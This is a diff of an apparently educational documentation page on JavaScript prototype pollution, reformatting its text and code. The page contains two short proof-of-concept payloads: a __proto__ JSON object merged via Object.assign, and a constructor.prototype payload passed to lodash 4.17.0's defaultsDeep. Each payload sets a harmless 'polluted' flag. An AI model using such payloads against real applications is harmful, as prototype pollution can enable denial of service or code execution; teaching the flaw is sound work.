@@ -5,30 +5,31 @@ sidebar_position: 6
 
 # Prototype Pollution
 
-
 ## The Attack
 
 It's a technical attack that requires a great understanding of JS internals like `__proto__`, `prototype`, [deep|shadow copy](https://we-are.bookmyshow.com/understanding-deep-and-shallow-copy-in-javascript-13438bad941c?gi=a658f8d5292b).
 
 This bug was extended in popular libraries [like Lodash](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/).
 
-<iframe width="100%" height="450"
-src="https://www.youtube.com/embed/LUsiFV3dsK8">
-</iframe>
-
+<iframe
+  width='100%'
+  height='450'
+  src='https://www.youtube.com/embed/LUsiFV3dsK8'
+></iframe>
 
 > Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.
 > (...) When that happens, it leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path the attacker injects, thereby leading to remote code execution
+>
 > - [Snyk VulnerabilityDB](https://snyk.io/vuln/SNYK-JS-LODASH-450202)
 
 This is a raw pollution in vanilla js
 
 ```js
-const a = {"a": 1, "b": 2}
+const a = { a: 1, b: 2 }
 const data = JSON.parse('{"__proto__": { "polluted": true}}')
- 
+
 const c = Object.assign({}, a, data)
-console.log(c.polluted) // true 
+console.log(c.polluted) // true
 ```
 
 This was a vulnerability in `lodash@4.17.0`
@@ -36,11 +37,11 @@ This was a vulnerability in `lodash@4.17.0`
 ```js
 // npm install lodash@4.17.0
 // https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.0/lodash.min.js
-const mergeFn = require('lodash').defaultsDeep;
+const mergeFn = require('lodash').defaultsDeep
 const payload = '{"constructor": {"prototype": {"polluted": true}}}'
- 
-mergeFn({}, JSON.parse(payload));
- 
+
+mergeFn({}, JSON.parse(payload))
+
 const newObject = {}
 console.log(newObject.polluted) //true
 ```
